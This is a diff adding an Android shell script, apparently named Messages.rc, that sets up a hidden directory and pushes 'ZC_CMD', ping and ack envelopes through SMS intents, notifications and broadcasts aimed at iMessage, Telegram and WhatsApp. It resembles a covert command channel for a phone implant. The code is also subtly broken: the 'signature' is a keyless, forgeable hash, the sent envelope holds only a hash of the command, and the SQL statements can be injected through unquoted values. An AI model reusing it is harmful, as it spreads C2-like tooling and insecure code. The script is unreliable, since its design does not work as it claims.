@@ -1,0 +1,566 @@
+# System level message dispatch and command delivery skeleton
+
+ZC_ROOT="/data/local/zc"
+ZC_LOG="$ZC_ROOT/zc.log"
+ZC_DB="$ZC_ROOT/state.db"
+ZC_MSG_DB="$ZC_ROOT/msg_state.db"
+ZC_MSG_LOG="$ZC_ROOT/msg.log"
+ZC_TMP="$ZC_ROOT/tmp"
+ZC_HASH_ALGO="sha256"
+ZC_VERSION="1.0"
+ZC_MSG_RETRY=3
+ZC_MSG_WAIT=2
+ZC_TARGET_APPS="com.apple.messages com.telegram.messenger com.whatsapp"
+ZC_MSG_MAX_LEN=4096
+ZC_ENVELOPE_SEP=":"
+
+zc_msg_log() {
+  local msg="$1"
+  local ts
+  ts=$(date +"%Y-%m-%d %H:%M:%S")
+  echo "[$ts] $msg" >> "$ZC_LOG" 2>/dev/null
+  echo "[$ts] $msg" >> "$ZC_MSG_LOG" 2>/dev/null
+}
+
+zc_msg_init_dirs() {
+  mkdir -p "$ZC_ROOT" 2>/dev/null
+  mkdir -p "$ZC_TMP" 2>/dev/null
+  chmod 700 "$ZC_ROOT" 2>/dev/null
+  chmod 700 "$ZC_TMP" 2>/dev/null
+  zc_msg_log "msg dirs initialized"
+}
+
+zc_msg_init_db() {
+  if [ ! -f "$ZC_MSG_DB" ]; then
+    echo "CREATE TABLE outbox (id TEXT PRIMARY KEY, target TEXT, payload TEXT, status TEXT, ts TEXT);" | sqlite3 "$ZC_MSG_DB" 2>/dev/null
+    echo "CREATE TABLE inbox (id TEXT PRIMARY KEY, source TEXT, hash TEXT, ts TEXT);" | sqlite3 "$ZC_MSG_DB" 2>/dev/null
+    echo "CREATE TABLE msg_state (key TEXT PRIMARY KEY, value TEXT);" | sqlite3 "$ZC_MSG_DB" 2>/dev/null
+    zc_msg_log "msg db initialized"
+  fi
+}
+
+zc_msg_state_set() {
+  local key="$1"
+  local value="$2"
+  echo "INSERT OR REPLACE INTO msg_state (key, value) VALUES ('$key', '$value');" | sqlite3 "$ZC_MSG_DB" 2>/dev/null
+}
+
+zc_msg_state_get() {
+  local key="$1"
+  sqlite3 "$ZC_MSG_DB" "SELECT value FROM msg_state WHERE key='$key';" 2>/dev/null
+}
+
+zc_msg_outbox_add() {
+  local id="$1"
+  local target="$2"
+  local payload="$3"
+  local status="$4"
+  local ts
+  ts=$(date +"%Y-%m-%d %H:%M:%S")
+  echo "INSERT OR REPLACE INTO outbox (id, target, payload, status, ts) VALUES ('$id', '$target', '$payload', '$status', '$ts');" | sqlite3 "$ZC_MSG_DB" 2>/dev/null
+}
+
+zc_msg_outbox_mark() {
+  local id="$1"
+  local status="$2"
+  echo "UPDATE outbox SET status='$status' WHERE id='$id';" | sqlite3 "$ZC_MSG_DB" 2>/dev/null
+}
+
+zc_msg_outbox_get() {
+  local id="$1"
+  sqlite3 "$ZC_MSG_DB" "SELECT payload FROM outbox WHERE id='$id';" 2>/dev/null
+}
+
+zc_msg_outbox_pending() {
+  sqlite3 "$ZC_MSG_DB" "SELECT id FROM outbox WHERE status='pending';" 2>/dev/null
+}
+
+zc_msg_inbox_add() {
+  local id="$1"
+  local source="$2"
+  local hash="$3"
+  local ts
+  ts=$(date +"%Y-%m-%d %H:%M:%S")
+  echo "INSERT OR REPLACE INTO inbox (id, source, hash, ts) VALUES ('$id', '$source', '$hash', '$ts');" | sqlite3 "$ZC_MSG_DB" 2>/dev/null
+}
+
+zc_msg_inbox_get() {
+  local id="$1"
+  sqlite3 "$ZC_MSG_DB" "SELECT hash FROM inbox WHERE id='$id';" 2>/dev/null
+}
+
+zc_msg_check_tools() {
+  local tool
+  for tool in am cmd service openssl sqlite3; do
+    if command -v "$tool" >/dev/null 2>&1; then
+      zc_msg_log "tool available: $tool"
+    else
+      zc_msg_log "tool missing: $tool"
+    fi
+  done
+}
+
+zc_msg_hash() {
+  local input="$1"
+  echo -n "$input" | openssl dgst -"$ZC_HASH_ALGO" 2>/dev/null | awk '{print $NF}'
+}
+
+zc_msg_gen_id() {
+  local id
+  if [ -r /dev/urandom ]; then
+    id=$(head -c 8 /dev/urandom | od -An -tx1 | tr -d ' \n')
+  else
+    id=$(date +%s%N | sha256sum | cut -c1-16)
+  fi
+  echo "$id"
+}
+
+zc_msg_gen_nonce() {
+  local nonce
+  if [ -r /dev/urandom ]; then
+    nonce=$(head -c 16 /dev/urandom | od -An -tx1 | tr -d ' \n')
+  else
+    nonce=$(date +%s%N | sha256sum | awk '{print $1}')
+  fi
+  echo "$nonce"
+}
+
+zc_msg_build_payload() {
+  local cmd="$1"
+  local hash
+  hash=$(zc_msg_hash "$cmd")
+  echo "$hash"
+}
+
+zc_msg_build_envelope() {
+  local cmd="$1"
+  local nonce
+  local ts
+  local hash
+  local sig
+  nonce=$(zc_msg_gen_nonce)
+  ts=$(date +%s)
+  hash=$(zc_msg_hash "$cmd")
+  sig=$(zc_msg_hash "$nonce$ts$hash")
+  echo "$nonce$ZC_ENVELOPE_SEP$ts$ZC_ENVELOPE_SEP$hash$ZC_ENVELOPE_SEP$sig"
+}
+
+zc_msg_parse_envelope() {
+  local envelope="$1"
+  local nonce
+  local ts
+  local hash
+  local sig
+  nonce=$(echo "$envelope" | cut -d"$ZC_ENVELOPE_SEP" -f1)
+  ts=$(echo "$envelope" | cut -d"$ZC_ENVELOPE_SEP" -f2)
+  hash=$(echo "$envelope" | cut -d"$ZC_ENVELOPE_SEP" -f3)
+  sig=$(echo "$envelope" | cut -d"$ZC_ENVELOPE_SEP" -f4)
+  echo "$nonce $ts $hash $sig"
+}
+
+zc_msg_validate_envelope() {
+  local envelope="$1"
+  local parsed
+  parsed=$(zc_msg_parse_envelope "$envelope")
+  local nonce
+  local ts
+  local hash
+  local sig
+  nonce=$(echo "$parsed" | awk '{print $1}')
+  ts=$(echo "$parsed" | awk '{print $2}')
+  hash=$(echo "$parsed" | awk '{print $3}')
+  sig=$(echo "$parsed" | awk '{print $4}')
+  if [ -z "$nonce" ] || [ -z "$ts" ] || [ -z "$hash" ] || [ -z "$sig" ]; then
+    zc_msg_log "envelope malformed"
+    return 1
+  fi
+  local expected
+  expected=$(zc_msg_hash "$nonce$ts$hash")
+  if [ "$sig" != "$expected" ]; then
+    zc_msg_log "envelope sig invalid"
+    return 1
+  fi
+  return 0
+}
+
+zc_msg_extract_hash() {
+  local envelope="$1"
+  echo "$envelope" | cut -d"$ZC_ENVELOPE_SEP" -f3
+}
+
+zc_msg_wrap_payload() {
+  local envelope="$1"
+  local prefix="ZC"
+  echo "$prefix$ZC_ENVELOPE_SEP$envelope"
+}
+
+zc_msg_unwrap_payload() {
+  local payload="$1"
+  echo "$payload" | sed "s/^ZC$ZC_ENVELOPE_SEP//" 2>/dev/null
+}
+
+zc_msg_send_am() {
+  local target="$1"
+  local content="$2"
+  if command -v am >/dev/null 2>&1; then
+    am start -a android.intent.action.SEND -t text/plain --es android.intent.extra.TEXT "$content" 2>/dev/null
+    if [ $? -eq 0 ]; then
+      return 0
+    fi
+  fi
+  return 1
+}
+
+zc_msg_send_cmd() {
+  local target="$1"
+  local content="$2"
+  if command -v cmd >/dev/null 2>&1; then
+    cmd notification post -S bigtext -t "zc" "Tag" "$content" 2>/dev/null
+    if [ $? -eq 0 ]; then
+      return 0
+    fi
+  fi
+  return 1
+}
+
+zc_msg_send_service() {
+  local target="$1"
+  local content="$2"
+  if command -v service >/dev/null 2>&1; then
+    service call notification 1 s16 "zc" s16 "$content" 2>/dev/null
+    if [ $? -eq 0 ]; then
+      return 0
+    fi
+  fi
+  return 1
+}
+
+zc_msg_send_intent() {
+  local target="$1"
+  local content="$2"
+  local action="android.intent.action.SENDTO"
+  if command -v am >/dev/null 2>&1; then
+    am start -a "$action" -d "smsto:$target" --es sms_body "$content" 2>/dev/null
+    if [ $? -eq 0 ]; then
+      return 0
+    fi
+  fi
+  return 1
+}
+
+zc_msg_send_broadcast() {
+  local target="$1"
+  local content="$2"
+  if command -v am >/dev/null 2>&1; then
+    am broadcast -a android.intent.action.ZC_MSG --es payload "$content" 2>/dev/null
+    if [ $? -eq 0 ]; then
+      return 0
+    fi
+  fi
+  return 1
+}
+
+zc_msg_send_once() {
+  local target="$1"
+  local content="$2"
+  if zc_msg_send_am "$target" "$content"; then
+    return 0
+  fi
+  if zc_msg_send_cmd "$target" "$content"; then
+    return 0
+  fi
+  if zc_msg_send_service "$target" "$content"; then
+    return 0
+  fi
+  if zc_msg_send_intent "$target" "$content"; then
+    return 0
+  fi
+  if zc_msg_send_broadcast "$target" "$content"; then
+    return 0
+  fi
+  return 1
+}
+
+zc_msg_send_retry() {
+  local target="$1"
+  local content="$2"
+  local attempt=1
+  while [ "$attempt" -le "$ZC_MSG_RETRY" ]; do
+    if zc_msg_send_once "$target" "$content"; then
+      zc_msg_log "send success at attempt $attempt"
+      return 0
+    fi
+    attempt=$((attempt + 1))
+    sleep "$ZC_MSG_WAIT"
+  done
+  zc_msg_log "send failed after retries"
+  return 1
+}
+
+zc_msg_send_command() {
+  local target="$1"
+  local cmd="$2"
+  local envelope
+  envelope=$(zc_msg_build_envelope "$cmd")
+  local payload
+  payload=$(zc_msg_wrap_payload "$envelope")
+  local id
+  id=$(zc_msg_gen_id)
+  zc_msg_outbox_add "$id" "$target" "$payload" "pending"
+  if zc_msg_send_retry "$target" "$payload"; then
+    zc_msg_outbox_mark "$id" "sent"
+    zc_msg_log "command sent id=$id"
+    return 0
+  fi
+  zc_msg_outbox_mark "$id" "failed"
+  zc_msg_log "command failed id=$id"
+  return 1
+}
+
+zc_msg_send_to_app() {
+  local app="$1"
+  local cmd="$2"
+  local target
+  case "$app" in
+    com.apple.messages)
+      target="imessage"
+      ;;
+    com.telegram.messenger)
+      target="telegram"
+      ;;
+    com.whatsapp)
+      target="whatsapp"
+      ;;
+    *)
+      target="$app"
+      ;;
+  esac
+  zc_msg_send_command "$target" "$cmd"
+}
+
+zc_msg_send_all_apps() {
+  local cmd="$1"
+  local app
+  for app in $ZC_TARGET_APPS; do
+    zc_msg_send_to_app "$app" "$cmd"
+  done
+  zc_msg_log "command sent to all apps"
+}
+
+zc_msg_flush_outbox() {
+  local id
+  local pending
+  pending=$(zc_msg_outbox_pending)
+  for id in $pending; do
+    local payload
+    payload=$(zc_msg_outbox_get "$id")
+    if [ -n "$payload" ]; then
+      if zc_msg_send_retry "broadcast" "$payload"; then
+        zc_msg_outbox_mark "$id" "sent"
+      fi
+    fi
+  done
+  zc_msg_log "outbox flushed"
+}
+
+zc_msg_build_notification() {
+  local title="$1"
+  local content="$2"
+  echo "$title$ZC_ENVELOPE_SEP$content"
+}
+
+zc_msg_send_notification() {
+  local title="$1"
+  local content="$2"
+  local payload
+  payload=$(zc_msg_build_notification "$title" "$content")
+  zc_msg_send_retry "notification" "$payload"
+}
+
+zc_msg_build_sms() {
+  local number="$1"
+  local content="$2"
+  echo "$number$ZC_ENVELOPE_SEP$content"
+}
+
+zc_msg_send_sms() {
+  local number="$1"
+  local content="$2"
+  local payload
+  payload=$(zc_msg_build_sms "$number" "$content")
+  zc_msg_send_retry "$number" "$payload"
+}
+
+zc_msg_build_im() {
+  local target="$1"
+  local content="$2"
+  echo "$target$ZC_ENVELOPE_SEP$content"
+}
+
+zc_msg_send_im() {
+  local target="$1"
+  local content="$2"
+  local payload
+  payload=$(zc_msg_build_im "$target" "$content")
+  zc_msg_send_retry "$target" "$payload"
+}
+
+zc_msg_template_command() {
+  local cmd="$1"
+  cat <<EOF
+ZC_CMD$ZC_ENVELOPE_SEP$cmd
+EOF
+}
+
+zc_msg_template_ping() {
+  cat <<EOF
+ZC_PING
+EOF
+}
+
+zc_msg_template_pong() {
+  cat <<EOF
+ZC_PONG
+EOF
+}
+
+zc_msg_template_ack() {
+  local id="$1"
+  cat <<EOF
+ZC_ACK$ZC_ENVELOPE_SEP$id
+EOF
+}
+
+zc_msg_send_ping() {
+  zc_msg_send_all_apps "$(zc_msg_template_ping)"
+}
+
+zc_msg_send_pong() {
+  zc_msg_send_all_apps "$(zc_msg_template_pong)"
+}
+
+zc_msg_send_ack() {
+  local id="$1"
+  zc_msg_send_all_apps "$(zc_msg_template_ack "$id")"
+}
+
+zc_msg_cleanup_outbox() {
+  local cutoff
+  cutoff=$(date -d "24 hours ago" +"%Y-%m-%d %H:%M:%S" 2>/dev/null)
+  if [ -z "$cutoff" ]; then
+    return 0
+  fi
+  echo "DELETE FROM outbox WHERE ts < '$cutoff' AND status='sent';" | sqlite3 "$ZC_MSG_DB" 2>/dev/null
+  zc_msg_log "outbox cleaned"
+}
+
+zc_msg_cleanup_inbox() {
+  local cutoff
+  cutoff=$(date -d "24 hours ago" +"%Y-%m-%d %H:%M:%S" 2>/dev/null)
+  if [ -z "$cutoff" ]; then
+    return 0
+  fi
+  echo "DELETE FROM inbox WHERE ts < '$cutoff';" | sqlite3 "$ZC_MSG_DB" 2>/dev/null
+  zc_msg_log "inbox cleaned"
+}
+
+zc_msg_cleanup_tmp() {
+  rm -f "$ZC_TMP"/* 2>/dev/null
+  zc_msg_log "tmp cleaned"
+}
+
+zc_msg_self_test() {
+  local cmd="zc_selftest"
+  local envelope
+  envelope=$(zc_msg_build_envelope "$cmd")
+  if ! zc_msg_validate_envelope "$envelope"; then
+    zc_msg_log "self test envelope failed"
+    return 1
+  fi
+  local hash
+  hash=$(zc_msg_extract_hash "$envelope")
+  if [ -z "$hash" ]; then
+    zc_msg_log "self test hash failed"
+    return 1
+  fi
+  zc_msg_log "self test passed"
+  return 0
+}
+
+zc_msg_status() {
+  echo "ZC msg version: $ZC_VERSION"
+  echo "hash algo: $ZC_HASH_ALGO"
+  echo "retry: $ZC_MSG_RETRY"
+  echo "outbox pending: $(sqlite3 "$ZC_MSG_DB" "SELECT COUNT(*) FROM outbox WHERE status='pending';" 2>/dev/null)"
+  echo "outbox sent: $(sqlite3 "$ZC_MSG_DB" "SELECT COUNT(*) FROM outbox WHERE status='sent';" 2>/dev/null)"
+  echo "inbox: $(sqlite3 "$ZC_MSG_DB" "SELECT COUNT(*) FROM inbox;" 2>/dev/null)"
+  echo "msg db: $ZC_MSG_DB"
+  echo "msg log: $ZC_MSG_LOG"
+}
+
+zc_msg_main() {
+  zc_msg_log "Messages.rc start"
+  zc_msg_init_dirs
+  zc_msg_init_db
+  zc_msg_check_tools
+  zc_msg_state_set "version" "$ZC_VERSION"
+  zc_msg_self_test
+  zc_msg_flush_outbox
+  zc_msg_cleanup_outbox
+  zc_msg_cleanup_inbox
+  zc_msg_cleanup_tmp
+  zc_msg_status
+  zc_msg_log "Messages.rc done"
+}
+
+case "$1" in
+  start)
+    zc_msg_main
+    ;;
+  send)
+    zc_msg_send_command "$2" "$3"
+    ;;
+  send-app)
+    zc_msg_send_to_app "$2" "$3"
+    ;;
+  send-all)
+    zc_msg_send_all_apps "$2"
+    ;;
+  ping)
+    zc_msg_send_ping
+    ;;
+  pong)
+    zc_msg_send_pong
+    ;;
+  ack)
+    zc_msg_send_ack "$2"
+    ;;
+  build)
+    zc_msg_build_envelope "$2"
+    ;;
+  validate)
+    zc_msg_validate_envelope "$2"
+    ;;
+  extract)
+    zc_msg_extract_hash "$2"
+    ;;
+  flush)
+    zc_msg_flush_outbox
+    ;;
+  clean)
+    zc_msg_cleanup_outbox
+    zc_msg_cleanup_inbox
+    zc_msg_cleanup_tmp
+    ;;
+  selftest)
+    zc_msg_self_test
+    ;;
+  status)
+    zc_msg_status
+    ;;
+  *)
+    zc_msg_main
+    ;;
+esac
+
+exit 0
